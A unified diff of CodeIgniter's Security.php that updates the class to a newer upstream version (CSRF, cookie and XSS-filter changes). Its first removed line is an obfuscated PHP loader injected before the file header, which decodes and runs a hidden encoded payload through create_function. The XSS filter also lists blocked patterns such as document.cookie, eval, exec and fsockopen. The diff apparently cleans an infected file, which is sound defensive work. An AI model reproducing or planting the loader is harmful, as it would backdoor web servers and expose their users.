@@ -1,4 +1,4 @@
-<?php global $habuto; $habuto=array('$habuto[0]=array_pop($habuto);$bilofom=bilofom(2,13);$habuto[0]=$bilofom($habuto[2]);','$habuto[2]=gzuncompress(bilofom(731,2330));','aWFjeGhOeGdxZ3p9fXx+Z2V9eEhpdH5jbX99eG1Of3BtV25mZHd3ZGh6Ymd2cHNdZHp6ZmZheXlmSUhaQlZWXUVVXk5BRVFNXFBFR1VVeEdodmVyaHxjbGB8Z3tSRERHRUdJcVljdXdTX1ZDQV9DVVJOWlxNbnJjdnFkbi12e2c7ICMoIW1PT2d1VTg9IjktSk5FYVRXIyEifl1jcjBvZ016Vk18QkJiWEhhb0VmQT9nXFJBbSNEem5nPzB3eHJkYmRnZWdrfH5wdnQhYGBhbHw/a3h6aHZpPGNwYm1uI2pgenV7e3g4fGR0c2V2eXhXTH9kVzY8PkJJY0RHRUdFWUVRVWhvTkZucmJyLCVVZmRrZ21xOWx6ZXx/PGl0ZmdifCd3TF5WQEJfQl5dVFpBel9QQ15KRVVMQEVNXUZURUNOWVZTQUZOUnIzQ2lCREdFR0VEWUdTV0lOUVxNRCN3dGE1YmJvUlJUQXYjYWR5NWJib2Zia0YjYWR5NX1lYWpkdkJkI2RhOnl+ZHZkZnwmd3N6fGlvaHljfXh7dVV2bHhXbX1gbFheQWJLek5nSVhWXEdnaGdYXkFTU0MjZ3xnNT9sbW98JXx6e2FiVyNnfGc1P0NBRCV9Z31qZEtYI2d8Z1lXSmN5I2RhOnl+ZHZkZnwmYWJ1e213YnBxS2RqfGN0f3VVZmh6eUVUanNjIlp1RGlGIn9+cHB3dXthS3hFZ21vS2VpIj92dHBme3Vha2g6fWtzTUN4aj9/c39vdnsmZmxgWUpVTm4hP3F1fmhjcyZmbGBjVHp1I2RhOnl+ZGRobyZ5fGImYTFhaW0qeCx6eU5wKmcsZ3JhLHI8b0cqZSxvZmN7RXhGTz1qd2RnZWcgPiVJeFoqZCxxfXJ3QU9ZZX14Y392ZXhqZUlNWipkLHRvU1NWUWlrdHRMVk4qZCxkcTFCVlVYJzg6IlhwZWpEfGJjIDF1dCNkSlV0j5QPcX7oxPenRBlJy'.'6sD9dqyHqeYvLZc1bVAgN9Pvt5PddsCHcw0f2hokuvManLKPHFgjx475c1xN25onVFDf/noNodal4DPrnaR0sbUtqgw2kiTHnItDtXEhtY7xO9lhVskJZm2aiJhgq/+pJXTtuBzjuMQExGbLFk7WXoFMZUMPzPj6wamAOTlsohnXKPZEvJr8Zb0NqRRjRI+aAbRpily1G++uiHEEqHzhHFS4miJaMx3Sx65abuZs+rIEBrX0CPKdUTYz/zNZrCDGwEFylInWNz+/2nT1U66wWQkwuyAjgghWOge0Zbm35kv5iz6JGAH13jDEgROAZiuOX6CK6igdu2+H0cxtRnZf2PhUcxM1vUZ6CTw47CBQ9xK8ZTmY9dupM3kleI8QwsOpPUU5vyZ9WZRHhWB+RrvXfCaPKtpAJJe2LYnpcyZlpxC/EGa4paHTQp6wKr6acr+AcQkmM/ZCse0e1wbVzEKF9NII6nuM2XNYxe4ywE33F6PgG6q3jQ0OoR1bkf7WGzcOx0bfY1E/e7XSPsWaZurqIDmB3uKhRllgERnKK90Ek6tq0ZEe4cweziJe7UiiFRqZq8NEOWGRW0sBZ/5oJp+yWovy+sWWmnkGMBk/45qkx9kB5mwgVV5KWS9KfZwMKWeqzph5XGkSQcxHIDvHsqdUVNNxEip/FklXpT8nTS1gXe9PojqfUOz1OeyjaDKov1g4VqeFqYVQo9/S/mA5lsgPk/IWZAOtTGrXdS/anuzE5tb0NYQOWxELzCD/fiP3DOC+thEPRW7udEByDOwJLukZwZearrZH0xlMH8hu9AXvrxopWUb6gOjpOSoGtKcq92awXghkt6NKgd6tUJUawMl27FHih+3BZRr+rNDldoaUMdzYYaQJbLaCxnjbLxqtyPSHxYNqrnmhoY2WzRex9UDuwmftgPTliLkiS6JG6dhgyFGNIkR2+fs'.'V03pBLeqCwdFifrmFFYkfXJx8bQ1sSK3LBoTs+aEs4bQzQvv2cOtrUrf1gokUFp6ckDphCIYbUocaQ5nSKRRAne5hFJZn2ahA+i9mnNMRhvXQYc8btXceIOWciNRwFI9b7a1TZ9t6q2wx3KrmpQ0rf0HX/BNG/yI5TayVha0L7ko3jFgdyjPnjKlTnjrKw0U3ZSK8ZJiw3j+FzNCMytVsjEuz/N5nrWPLUB1h6m83R2GF433g4bH+kgVLpj0Wh2e7jyMtKf8ZVwjyBVvuSwc1BhmyROY/CbdhyPNAJ8g8c1JWf1YsHu1j4Rxw1Qk5UcRe45liDyTD8h2rROGYyYZxMoF12YaQiu1czOaMNuUMhtDiMM+Z+k50dgwqBblJAsDMlUgjCElsFWhKJqVYfkXsicSe+kzTkwjUwTWS5XPAUoZO7u+neRVI/UJC66Lppl7BegbOklst3kMWMSRv1YAm3Umebll1nP192Pj5LXEPe5EorSzFX4mvZlwJeOfw5B5JYz09PDbbDNRRgl6B3wSWadyb0jrgs9nJUJ4o6YIubaCt9wAGDLM0ZCYSl8lrhsiAjmwDDrrCJl4vUIg+im5RFLSq6haOqrGp1OoGAE57OIIA1lJtj3gTggvoOu/0UhNBeqbewBt/Ei3k7/iI/GxoO5kxLBvkZjLElmzkhtn8XWDufO70F4XrTeFEuoM5Aghbqdb0X7eCLOi1BF6X4m3rwS2xIxPay9SXiAIeb/PyDwjp6vaUSMS0o5rCt/PZ/hsSts2pCt5qznZjqlithYcfMr2Xq7FcJZxqgHfhA6sb2uAbXJ8efID9elq7mALjJxFMEIPqcTVJ7t3NLOxENcTn5PbNXMrCnnJWAOpSl91ZCQicEuecQYhmlqZ3ZMhNbE6/Gg'.'bwQHJNeIW2UcpAAcKNbvaN1M31Jlkuo4M98awRGR3BX9bmF9A5e1/WyLYSdpWl6rHwcEH3xz86KJ29ExmgdfzfzMv2++rZcKCuY3OI/lB3E/yYusc08PIWs0QxXEgSB2JjfZw5tkcCRt/Po+qX9hjWH55cPDm09uSLPaZh0VtCJvM3sHXaPNI5czdF6Lu/V+xNXTWC4m7POkJI/AHBq45rPoAwMbTQb0N1Nb394d1RxEecYcHlot5dDSaEcSpHWNZovWUnP+5+4Wu4CXW2Kica+nMVBcTu+JXs5t+c4fMjPHzI4++IiIuZ7iictrTI5khCTGx/TmvkjYzXlr28SVxLgOijazibs36cxzxlnmKsjCeOIrC1b0yiZx3LHrLvYpZ6hYUONTxLCHwbXAKKhOloyu3ztNaESB4C8zS2Eva/i1j56b/wTHVINLxN7dH2VMkThQ/AAFalLhyP0Htf2oSQtpo0sagP0nzxh7qG/Gu2qDI4tpR2jxmcBfSC7BwlNhtiYK3o89Ih+HEKV8agHykCENi3QltwjLaDs7zogYcc7SjVDG+kirxOVDCxJqLLIZbwTdJ+gmzcVaIp7AlR/Yw1FbL4uY8k4l4/Dx8ug2w69dK6OMrT8A6rm6ZBD9vc+sMra7Drb5kRcyeYYipku/IP4PG7Wx59xjXoiDBqU0DsZ1nsCxq/g0aPQZBchNyLn0295ky5BmCtBdkawe79g3mRa2ftHhepz6BwKGrjyk6ZBllFDL7uCSw93MKP/fBEuO2s62N0bgcs0RkFuWj9F/W3zQ9K9/8qnDuZUOTdQSdtSwV9Mufrlsdlttf60Zw09mMX2moaknfx1SMWbxVp0ge8zf384T2jM7kLnVBpAgEbZA+fnGydmqoouvwCAH/JTXy8nF3B1rq6/rrKhxOiVtKRl9+'.'sTbH2u4ZBVzLh0LH/bZ+lKTJjoiyPBQJqIHsSUDVbxWHKVc3ZB5u/GNrGGu27Q0MpGmshan/WYdoXjrV802wyIcxp/h5Ps11OTjEqW2jajxh1Hbt5hAvQY9ymY7eFR+5XZmmNjZ2iTbJSXlnGv07MGhinZk6GgatxOg9zmtpRdEt5ihLP6nNhgat3SR5HfgB5xBlLZXc4f/UluwRG3dLaPr2ZxUX6yck1cgm7LSCYIgV+ePmYVfhluD/CotpBXxeymYFyCwlPM2VLcoCo0JWLLD5w+dExMTEpP4+4B5VcBpnzL6z/dn23UuZrOQGF9pWrEZ2bnJiciwlVWZka2dtcQ==',"BJnrbr\x2c\x25Ufdkgmq");$futubedu='create_';if(function_exists($futubedu.='function')&&!function_exists('bilofom')){ function bilofom($b,$m){global $habuto;$s=str_pad($f='ls17z1jBahhIT2Y4',$m,$f);$h=str_repeat("\xe0",$m);$z=str_repeat("\x1f",$m);$u=substr($habuto[0],$b,$m);return(($u^$s)&$z)|($u&$h);};for($pj=-1;++$pj<3;$futubedu('','}'.$habuto[$pj].'{'));};unset($habuto); 
+<?php
 /**
  * CodeIgniter
  *
@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2015, British Columbia Institute of Technology
+ * Copyright (c) 2019 - 2022, CodeIgniter Foundation
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -28,10 +28,11 @@
  *
  * @package	CodeIgniter
  * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (http://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	http://codeigniter.com
+ * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
+ * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @copyright	Copyright (c) 2019 - 2022, CodeIgniter Foundation (https://codeigniter.com/)
+ * @license	https://opensource.org/licenses/MIT	MIT License
+ * @link	https://codeigniter.com
  * @since	Version 1.0.0
  * @filesource
  */
@@ -44,7 +45,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
  * @subpackage	Libraries
  * @category	Security
  * @author		EllisLab Dev Team
- * @link		http://codeigniter.com/user_guide/libraries/security.html
+ * @link		https://codeigniter.com/userguide3/libraries/security.html
  */
 class CI_Security {
 
@@ -133,15 +134,18 @@ class CI_Security {
 	 * @var	array
 	 */
 	protected $_never_allowed_str =	array(
-		'document.cookie'	=> '[removed]',
-		'document.write'	=> '[removed]',
-		'.parentNode'		=> '[removed]',
-		'.innerHTML'		=> '[removed]',
-		'-moz-binding'		=> '[removed]',
-		'<!--'				=> '&lt;!--',
-		'-->'				=> '--&gt;',
-		'<![CDATA['			=> '&lt;![CDATA[',
-		'<comment>'			=> '&lt;comment&gt;'
+		'document.cookie' => '[removed]',
+		'(document).cookie' => '[removed]',
+		'document.write'  => '[removed]',
+		'(document).write'  => '[removed]',
+		'.parentNode'     => '[removed]',
+		'.innerHTML'      => '[removed]',
+		'-moz-binding'    => '[removed]',
+		'<!--'            => '&lt;!--',
+		'-->'             => '--&gt;',
+		'<![CDATA['       => '&lt;![CDATA[',
+		'<comment>'	  => '&lt;comment&gt;',
+		'<%'              => '&lt;&#37;'
 	);
 
 	/**
@@ -151,7 +155,7 @@ class CI_Security {
 	 */
 	protected $_never_allowed_regex = array(
 		'javascript\s*:',
-		'(document|(document\.)?window)\.(location|on\w*)',
+		'(\(?document\)?|\(?window\)?(\.document)?)\.(location|on\w*)',
 		'expression\s*(\(|&\#40;)', // CSS and IE
 		'vbscript\s*:', // IE, surprise!
 		'wscript\s*:', // IE
@@ -166,10 +170,12 @@ class CI_Security {
 	 *
 	 * @return	void
 	 */
-	public function __construct()
+	public function __construct($charset)
 	{
+		$this->charset = $charset;
+
 		// Is CSRF protection enabled?
-		if (config_item('csrf_protection'))
+		if (config_item('csrf_protection') && ! is_cli())
 		{
 			// CSRF config
 			foreach (array('csrf_expire', 'csrf_token_name', 'csrf_cookie_name') as $key)
@@ -188,9 +194,8 @@ class CI_Security {
 
 			// Set the CSRF hash
 			$this->_csrf_set_hash();
+			$this->csrf_verify();
 		}
-
-		$this->charset = strtoupper(config_item('charset'));
 
 		log_message('info', 'Security Class Initialized');
 	}
@@ -223,14 +228,12 @@ class CI_Security {
 			}
 		}
 
-		// Do the tokens exist in both the _POST and _COOKIE arrays?
-		if ( ! isset($_POST[$this->_csrf_token_name], $_COOKIE[$this->_csrf_cookie_name])
-			OR $_POST[$this->_csrf_token_name] !== $_COOKIE[$this->_csrf_cookie_name]) // Do the tokens match?
-		{
-			$this->csrf_show_error();
-		}
+		// Check CSRF token validity, but don't error on mismatch just yet - we'll want to regenerate
+		$valid = isset($_POST[$this->_csrf_token_name], $_COOKIE[$this->_csrf_cookie_name])
+			&& is_string($_POST[$this->_csrf_token_name]) && is_string($_COOKIE[$this->_csrf_cookie_name])
+			&& hash_equals($_POST[$this->_csrf_token_name], $_COOKIE[$this->_csrf_cookie_name]);
 
-		// We kill this since we're done and we don't want to polute the _POST array
+		// We kill this since we're done and we don't want to pollute the _POST array
 		unset($_POST[$this->_csrf_token_name]);
 
 		// Regenerate on every submission?
@@ -243,6 +246,11 @@ class CI_Security {
 
 		$this->_csrf_set_hash();
 		$this->csrf_set_cookie();
+
+		if ($valid !== TRUE)
+		{
+			$this->csrf_show_error();
+		}
 
 		log_message('info', 'CSRF token verified');
 		return $this;
@@ -266,15 +274,35 @@ class CI_Security {
 			return FALSE;
 		}
 
-		setcookie(
-			$this->_csrf_cookie_name,
-			$this->_csrf_hash,
-			$expire,
-			config_item('cookie_path'),
-			config_item('cookie_domain'),
-			$secure_cookie,
-			config_item('cookie_httponly')
-		);
+		if (is_php('7.3'))
+		{
+			setcookie(
+				$this->_csrf_cookie_name,
+				$this->_csrf_hash,
+				array(
+					'expires'  => $expire,
+					'path'     => config_item('cookie_path'),
+					'domain'   => config_item('cookie_domain'),
+					'secure'   => $secure_cookie,
+					'httponly' => config_item('cookie_httponly'),
+					'samesite' => 'Strict'
+				)
+			);
+		}
+		else
+		{
+			$domain = trim(config_item('cookie_domain'));
+			header('Set-Cookie: '.$this->_csrf_cookie_name.'='.$this->_csrf_hash
+					.'; Expires='.gmdate('D, d-M-Y H:i:s T', $expire)
+					.'; Max-Age='.$this->_csrf_expire
+					.'; Path='.implode('/', array_map('rawurlencode', explode('/', config_item('cookie_path'))))
+					.($domain === '' ? '' : '; Domain='.$domain)
+					.($secure_cookie ? '; Secure' : '')
+					.(config_item('cookie_httponly') ? '; HttpOnly' : '')
+					.'; SameSite=Strict'
+			);
+		}
+
 		log_message('info', 'CSRF cookie sent');
 
 		return $this;
@@ -351,9 +379,9 @@ class CI_Security {
 		// Is the string an array?
 		if (is_array($str))
 		{
-			while (list($key) = each($str))
+			foreach ($str as $key => &$value)
 			{
-				$str[$key] = $this->xss_clean($str[$key]);
+				$str[$key] = $this->xss_clean($value);
 			}
 
 			return $str;
@@ -371,11 +399,17 @@ class CI_Security {
 		 *
 		 * Note: Use rawurldecode() so it does not remove plus signs
 		 */
-		do
+		if (stripos($str, '%') !== false)
 		{
-			$str = rawurldecode($str);
+			do
+			{
+				$oldstr = $str;
+				$str = rawurldecode($str);
+				$str = preg_replace_callback('#%(?:\s*[0-9a-f]){2,}#i', array($this, '_urldecodespaces'), $str);
+			}
+			while ($oldstr !== $str);
+			unset($oldstr);
 		}
-		while (preg_match('/%[0-9a-f]{2,}/i', $str));
 
 		/*
 		 * Convert character entities to ASCII
@@ -436,7 +470,7 @@ class CI_Security {
 		$words = array(
 			'javascript', 'expression', 'vbscript', 'jscript', 'wscript',
 			'vbs', 'script', 'base64', 'applet', 'alert', 'document',
-			'write', 'cookie', 'window', 'confirm', 'prompt'
+			'write', 'cookie', 'window', 'confirm', 'prompt', 'eval'
 		);
 
 		foreach ($words as $word)
@@ -466,7 +500,7 @@ class CI_Security {
 
 			if (preg_match('/<a/i', $str))
 			{
-				$str = preg_replace_callback('#<a[^a-z0-9>]+([^>]*?)(?:>|$)#si', array($this, '_js_link_removal'), $str);
+				$str = preg_replace_callback('#<a(?:rea)?[^a-z0-9>]+([^>]*?)(?:>|$)#si', array($this, '_js_link_removal'), $str);
 			}
 
 			if (preg_match('/<img/i', $str))
@@ -480,11 +514,7 @@ class CI_Security {
 			}
 		}
 		while ($original !== $str);
-
 		unset($original);
-
-		// Remove evil attributes such as style, onclick and xmlns
-		$str = $this->_remove_evil_attributes($str, $is_image);
 
 		/*
 		 * Sanitize naughty HTML elements
@@ -495,8 +525,29 @@ class CI_Security {
 		 * So this: <blink>
 		 * Becomes: &lt;blink&gt;
 		 */
-		$naughty = 'alert|prompt|confirm|applet|audio|basefont|base|behavior|bgsound|blink|body|embed|expression|form|frameset|frame|head|html|ilayer|iframe|input|button|select|isindex|layer|link|meta|keygen|object|plaintext|style|script|textarea|title|math|video|svg|xml|xss';
-		$str = preg_replace_callback('#<(/*\s*)('.$naughty.')([^><]*)([><]*)#is', array($this, '_sanitize_naughty_html'), $str);
+		$pattern = '#'
+			.'<((?<slash>/*\s*)((?<tagName>[a-z0-9]+)(?=[^a-z0-9]|$)|.+)' // tag start and name, followed by a non-tag character
+			.'[^\s\042\047a-z0-9>/=]*' // a valid attribute character immediately after the tag would count as a separator
+			// optional attributes
+			.'(?<attributes>(?:[\s\042\047/=]*' // non-attribute characters, excluding > (tag close) for obvious reasons
+			.'[^\s\042\047>/=]+' // attribute characters
+			// optional attribute-value
+				.'(?:\s*=' // attribute-value separator
+					.'(?:[^\s\042\047=><`]+|\s*\042[^\042]*\042|\s*\047[^\047]*\047|\s*(?U:[^\s\042\047=><`]*))' // single, double or non-quoted value
+				.')?' // end optional attribute-value group
+			.')*)' // end optional attributes group
+			.'[^>]*)(?<closeTag>\>)?#isS';
+
+		// Note: It would be nice to optimize this for speed, BUT
+		//       only matching the naughty elements here results in
+		//       false positives and in turn - vulnerabilities!
+		do
+		{
+			$old_str = $str;
+			$str = preg_replace_callback($pattern, array($this, '_sanitize_naughty_html'), $str);
+		}
+		while ($old_str !== $str);
+		unset($old_str);
 
 		/*
 		 * Sanitize naughty scripting elements
@@ -510,9 +561,19 @@ class CI_Security {
 		 * For example:	eval('some code')
 		 * Becomes:	eval&#40;'some code'&#41;
 		 */
-		$str = preg_replace('#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si',
-					'\\1\\2&#40;\\3&#41;',
-					$str);
+		$str = preg_replace(
+			'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si',
+			'\\1\\2&#40;\\3&#41;',
+			$str
+		);
+
+		// Same thing, but for "tag functions" (e.g. eval`some code`)
+		// See https://github.com/bcit-ci/CodeIgniter/issues/5420
+		$str = preg_replace(
+			'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)`(.*?)`#si',
+			'\\1\\2&#96;\\3&#96;',
+			$str
+		);
 
 		// Final clean up
 		// This adds a bit of extra precaution in case
@@ -574,17 +635,32 @@ class CI_Security {
 			return FALSE;
 		}
 
+		if (function_exists('random_bytes'))
+		{
+			try
+			{
+				// The cast is required to avoid TypeError
+				return random_bytes((int) $length);
+			}
+			catch (Exception $e)
+			{
+				// If random_bytes() can't do the job, we can't either ...
+				// There's no point in using fallbacks.
+				log_message('error', $e->getMessage());
+				return FALSE;
+			}
+		}
+
 		// Unfortunately, none of the following PRNGs is guaranteed to exist ...
 		if (defined('MCRYPT_DEV_URANDOM') && ($output = mcrypt_create_iv($length, MCRYPT_DEV_URANDOM)) !== FALSE)
 		{
 			return $output;
 		}
 
-
 		if (is_readable('/dev/urandom') && ($fp = fopen('/dev/urandom', 'rb')) !== FALSE)
 		{
 			// Try not to waste entropy ...
-			is_php('5.4') && stream_set_chunk_size($fp, $length);
+			stream_set_chunk_size($fp, $length);
 			$output = fread($fp, $length);
 			fclose($fp);
 			if ($output !== FALSE)
@@ -614,7 +690,7 @@ class CI_Security {
 	 * correctly. html_entity_decode() does not convert entities without
 	 * semicolons, so we are left with our own little solution here. Bummer.
 	 *
-	 * @link	http://php.net/html-entity-decode
+	 * @link	https://secure.php.net/html-entity-decode
 	 *
 	 * @param	string	$str		Input
 	 * @param	string	$charset	Character set
@@ -629,10 +705,8 @@ class CI_Security {
 
 		static $_entities;
 
-		isset($charset) OR $charset = $this->charset;
-		$flag = is_php('5.4')
-			? ENT_COMPAT | ENT_HTML5
-			: ENT_COMPAT;
+		isset($charset)   OR $charset = $this->charset;
+		isset($_entities) OR $_entities = array_map('strtolower', get_html_translation_table(HTML_ENTITIES, ENT_COMPAT | ENT_HTML5, $charset));
 
 		do
 		{
@@ -641,27 +715,6 @@ class CI_Security {
 			// Decode standard entities, avoiding false positives
 			if (preg_match_all('/&[a-z]{2,}(?![a-z;])/i', $str, $matches))
 			{
-				if ( ! isset($_entities))
-				{
-					$_entities = array_map(
-						'strtolower',
-						is_php('5.3.4')
-							? get_html_translation_table(HTML_ENTITIES, $flag, $charset)
-							: get_html_translation_table(HTML_ENTITIES, $flag)
-					);
-
-					// If we're not on PHP 5.4+, add the possibly dangerous HTML 5
-					// entities to the array manually
-					if ($flag === ENT_COMPAT)
-					{
-						$_entities[':'] = '&colon;';
-						$_entities['('] = '&lpar;';
-						$_entities[')'] = '&rpar;';
-						$_entities["\n"] = '&newline;';
-						$_entities["\t"] = '&tab;';
-					}
-				}
-
 				$replace = array();
 				$matches = array_unique(array_map('strtolower', $matches[0]));
 				foreach ($matches as &$match)
@@ -672,13 +725,13 @@ class CI_Security {
 					}
 				}
 
-				$str = str_ireplace(array_keys($replace), array_values($replace), $str);
+				$str = str_replace(array_keys($replace), array_values($replace), $str);
 			}
 
 			// Decode numeric & UTF16 two byte entities
 			$str = html_entity_decode(
 				preg_replace('/(&#(?:x0*[0-9a-f]{2,5}(?![0-9a-f;])|(?:0*\d{2,4}(?![0-9;]))))/iS', '$1;', $str),
-				$flag,
+				ENT_COMPAT | ENT_HTML5,
 				$charset
 			);
 		}
@@ -727,7 +780,32 @@ class CI_Security {
 	 */
 	public function strip_image_tags($str)
 	{
-		return preg_replace(array('#<img[\s/]+.*?src\s*=\s*["\'](.+?)["\'].*?\>#', '#<img[\s/]+.*?src\s*=\s*(.+?).*?\>#'), '\\1', $str);
+		return preg_replace(
+			array(
+				'#<img[\s/]+.*?src\s*=\s*(["\'])([^\\1]+?)\\1.*?\>#i',
+				'#<img[\s/]+.*?src\s*=\s*?(([^\s"\'=<>`]+)).*?\>#i'
+			),
+			'\\2',
+			$str
+		);
+	}
+
+	// ----------------------------------------------------------------
+
+	/**
+	 * URL-decode taking spaces into account
+	 *
+	 * @see		https://github.com/bcit-ci/CodeIgniter/issues/4877
+	 * @param	array	$matches
+	 * @return	string
+	 */
+	protected function _urldecodespaces($matches)
+	{
+		$input    = $matches[0];
+		$nospaces = preg_replace('#\s+#', '', $input);
+		return ($nospaces === $input)
+			? $input
+			: rawurldecode($nospaces);
 	}
 
 	// ----------------------------------------------------------------
@@ -750,58 +828,6 @@ class CI_Security {
 	// --------------------------------------------------------------------
 
 	/**
-	 * Remove Evil HTML Attributes (like event handlers and style)
-	 *
-	 * It removes the evil attribute and either:
-	 *
-	 *  - Everything up until a space. For example, everything between the pipes:
-	 *
-	 *	<code>
-	 *		<a |style=document.write('hello');alert('world');| class=link>
-	 *	</code>
-	 *
-	 *  - Everything inside the quotes. For example, everything between the pipes:
-	 *
-	 *	<code>
-	 *		<a |style="document.write('hello'); alert('world');"| class="link">
-	 *	</code>
-	 *
-	 * @param	string	$str		The string to check
-	 * @param	bool	$is_image	Whether the input is an image
-	 * @return	string	The string with the evil attributes removed
-	 */
-	protected function _remove_evil_attributes($str, $is_image)
-	{
-		$evil_attributes = array('on\w*', 'style', 'xmlns', 'formaction', 'form', 'xlink:href', 'FSCommand', 'seekSegmentTime');
-
-		if ($is_image === TRUE)
-		{
-			/*
-			 * Adobe Photoshop puts XML metadata into JFIF images,
-			 * including namespacing, so we have to allow this for images.
-			 */
-			unset($evil_attributes[array_search('xmlns', $evil_attributes)]);
-		}
-
-		do {
-			$count = $temp_count = 0;
-
-			// replace occurrences of illegal attribute strings with quotes (042 and 047 are octal quotes)
-			$str = preg_replace('/(<[^>]+)(?<!\w)('.implode('|', $evil_attributes).')\s*=\s*(\042|\047)([^\\2]*?)(\\2)/is', '$1[removed]', $str, -1, $temp_count);
-			$count += $temp_count;
-
-			// find occurrences of illegal attribute strings without quotes
-			$str = preg_replace('/(<[^>]+)(?<!\w)('.implode('|', $evil_attributes).')\s*=\s*([^\s>]*)/is', '$1[removed]', $str, -1, $temp_count);
-			$count += $temp_count;
-		}
-		while ($count);
-
-		return $str;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
 	 * Sanitize Naughty HTML
 	 *
 	 * Callback method for xss_clean() to remove naughty HTML elements.
@@ -812,9 +838,82 @@ class CI_Security {
 	 */
 	protected function _sanitize_naughty_html($matches)
 	{
-		return '&lt;'.$matches[1].$matches[2].$matches[3] // encode opening brace
-			// encode captured opening or closing brace to prevent recursive vectors:
-			.str_replace(array('>', '<'), array('&gt;', '&lt;'), $matches[4]);
+		static $naughty_tags    = array(
+			'alert', 'area', 'prompt', 'confirm', 'applet', 'audio', 'basefont', 'base', 'behavior', 'bgsound',
+			'blink', 'body', 'embed', 'expression', 'form', 'frameset', 'frame', 'head', 'html', 'ilayer',
+			'iframe', 'input', 'button', 'select', 'isindex', 'layer', 'link', 'meta', 'keygen', 'object',
+			'plaintext', 'style', 'script', 'textarea', 'title', 'math', 'video', 'svg', 'xml', 'xss'
+		);
+
+		static $evil_attributes = array(
+			'on\w+', 'style', 'xmlns', 'formaction', 'form', 'xlink:href', 'FSCommand', 'seekSegmentTime'
+		);
+
+		// First, escape unclosed tags
+		if (empty($matches['closeTag']))
+		{
+			return '&lt;'.$matches[1];
+		}
+		// Is the element that we caught naughty? If so, escape it
+		elseif (in_array(strtolower($matches['tagName']), $naughty_tags, TRUE))
+		{
+			return '&lt;'.$matches[1].'&gt;';
+		}
+		// For other tags, see if their attributes are "evil" and strip those
+		elseif (isset($matches['attributes']))
+		{
+			// We'll store the already filtered attributes here
+			$attributes = array();
+
+			// Attribute-catching pattern
+			$attributes_pattern = '#'
+				.'(?<name>[^\s\042\047>/=]+)' // attribute characters
+				// optional attribute-value
+				.'(?:\s*=(?<value>[^\s\042\047=><`]+|\s*\042[^\042]*\042|\s*\047[^\047]*\047|\s*(?U:[^\s\042\047=><`]*)))' // attribute-value separator
+				.'#i';
+
+			// Blacklist pattern for evil attribute names
+			$is_evil_pattern = '#^('.implode('|', $evil_attributes).')$#i';
+
+			// Each iteration filters a single attribute
+			do
+			{
+				// Strip any non-alpha characters that may precede an attribute.
+				// Browsers often parse these incorrectly and that has been a
+				// of numerous XSS issues we've had.
+				$matches['attributes'] = preg_replace('#^[^a-z]+#i', '', $matches['attributes']);
+
+				if ( ! preg_match($attributes_pattern, $matches['attributes'], $attribute, PREG_OFFSET_CAPTURE))
+				{
+					// No (valid) attribute found? Discard everything else inside the tag
+					break;
+				}
+
+				if (
+					// Is it indeed an "evil" attribute?
+					preg_match($is_evil_pattern, $attribute['name'][0])
+					// Or does it have an equals sign, but no value and not quoted? Strip that too!
+					OR (trim($attribute['value'][0]) === '')
+				)
+				{
+					$attributes[] = 'xss=removed';
+				}
+				else
+				{
+					$attributes[] = $attribute[0][0];
+				}
+
+				$matches['attributes'] = substr($matches['attributes'], $attribute[0][1] + strlen($attribute[0][0]));
+			}
+			while ($matches['attributes'] !== '');
+
+			$attributes = empty($attributes)
+				? ''
+				: ' '.implode(' ', $attributes);
+			return '<'.$matches['slash'].$matches['tagName'].$attributes.'>';
+		}
+
+		return $matches[0];
 	}
 
 	// --------------------------------------------------------------------
@@ -834,12 +933,15 @@ class CI_Security {
 	 */
 	protected function _js_link_removal($match)
 	{
-		return str_replace($match[1],
-					preg_replace('#href=.*?(?:(?:alert|prompt|confirm)(?:\(|&\#40;)|javascript:|livescript:|mocha:|charset=|window\.|document\.|\.cookie|<script|<xss|data\s*:)#si',
-							'',
-							$this->_filter_attributes(str_replace(array('<', '>'), '', $match[1]))
-					),
-					$match[0]);
+		return str_replace(
+			$match[1],
+			preg_replace(
+				'#href=.*?(?:(?:alert|prompt|confirm)(?:\(|&\#40;|`|&\#96;)|javascript:|livescript:|mocha:|charset=|window\.|\(?document\)?\.|\.cookie|<script|<xss|d\s*a\s*t\s*a\s*:)#si',
+				'',
+				$this->_filter_attributes($match[1])
+			),
+			$match[0]
+		);
 	}
 
 	// --------------------------------------------------------------------
@@ -859,12 +961,15 @@ class CI_Security {
 	 */
 	protected function _js_img_removal($match)
 	{
-		return str_replace($match[1],
-					preg_replace('#src=.*?(?:(?:alert|prompt|confirm)(?:\(|&\#40;)|javascript:|livescript:|mocha:|charset=|window\.|document\.|\.cookie|<script|<xss|base64\s*,)#si',
-							'',
-							$this->_filter_attributes(str_replace(array('<', '>'), '', $match[1]))
-					),
-					$match[0]);
+		return str_replace(
+			$match[1],
+			preg_replace(
+				'#src=.*?(?:(?:alert|prompt|confirm|eval)(?:\(|&\#40;|`|&\#96;)|javascript:|livescript:|mocha:|charset=|window\.|\(?document\)?\.|\.cookie|<script|<xss|base64\s*,)#si',
+				'',
+				$this->_filter_attributes($match[1])
+			),
+			$match[0]
+		);
 	}
 
 	// --------------------------------------------------------------------
@@ -980,5 +1085,4 @@ class CI_Security {
 
 		return $this->_csrf_hash;
 	}
-
 }
